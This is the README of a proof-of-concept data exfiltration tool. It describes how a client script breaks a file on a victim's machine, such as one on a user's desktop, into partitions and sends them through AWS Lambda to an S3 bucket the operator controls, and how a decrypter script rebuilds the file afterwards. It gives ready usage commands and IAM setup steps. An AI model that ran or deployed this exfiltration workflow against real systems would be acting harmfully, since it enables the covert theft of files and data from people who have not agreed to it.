# AWS Lambda Exfil Tool [PoC]

Here we have a small PoC on how the program works (The gif is somewhat outdated but the idea is the same)

![StandaloneClientGif](media/standaloneClient.gif)

## About
The program follows the following diagram. Explanation on how each part functions is present on standaloneClient pdf file.  

![StandaloneClient diagram](media/Standalone_client_1.png?raw=true "Standalone Client Diagram")


## Usage
#### Client
`py clientName.py -s <Partition size in kb> -i <File to exfiltrate>`  
Example:  
`py clientName.py -s 100 -i "C:\Users\SomeUser\Desktop\test.txt"`
#### Decrypter
###### Note: If not sure about hostname and filename, check S3 Bucket after exfiltration
`py decrypter.py -n "Hostname" -i "Filename"`  
Example after exfiltrating test.txt:  
`py decrypter.py -n "ID4A0E" -i "test"`

Follow the prompts for decrypter setup, this will set AWS keys as well as region and bucket name.  
Decrypter setup is based on `decrypterConfig.json` (Which will be created after the first time decrypter is ran).  
If AWS account / bucket needs to be changed, please modify the above mentioned json file.

## Setup

###### Note: Use python 3.x  

#### IAM Console
Go to AWS IAM console and create a role (Remember the ARN name) with the following permissions:  

- AWSLambdaFullAccess
- AmazonS3FullAccess
- CloudWatchFullAccess

###### Run `pip install -r requirements.txt`

###### Run `py setup.py` and follow the prompts for client setup

###### Decrypter will be set up the first time it's ran, follow the prompts

#### Partitions
Please take in account the size of the file to be exfiltrated when defining the partition size.

#### Supported Files
The tool supports txt, csv and xlsx files but every file that is text based (For example a .py file) will be exfiltrated succesfully.
